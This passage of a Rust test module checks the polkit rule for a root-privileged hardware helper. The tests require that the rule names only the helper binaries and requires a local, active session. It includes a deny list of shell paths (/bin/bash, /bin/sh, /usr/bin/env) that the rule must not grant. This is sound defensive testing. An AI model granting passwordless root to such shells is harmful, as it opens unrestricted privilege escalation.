            "the card lists level 0, so it must not be turned away: {:?} (node: {})",
            stderr,
            sclk.display()
        );
    }

    /// The polkit rule grants passwordless root. It must name the helper binaries
    /// and nothing else -- granting a shell would make the tight helper pointless.
    #[test]
    fn polkit_rule_grants_only_the_helper_binaries() {
        let rule = polkit_rule();
        for candidate in HELPER_CANDIDATES {
            assert!(
                rule.contains(candidate),
                "polkit rule must cover {}",
                candidate
            );
        }
        for forbidden in ["/bin/bash", "/bin/sh", "/usr/bin/bash", "/usr/bin/env"] {
            assert!(
                !rule.contains(forbidden),
                "polkit rule must not grant {}",
                forbidden
            );
        }
    }

    /// Without local+active, any SSH session belonging to a wheel/sudo user
    /// inherits passwordless hardware control, as does a background session the
    /// user has switched away from.
    #[test]
    fn polkit_rule_requires_a_local_active_session() {
        let rule = polkit_rule();
        assert!(
            rule.contains("subject.local"),
            "rule must require a local session"
        );
        assert!(
            rule.contains("subject.active"),
            "rule must require an active session"
        );
    }
}
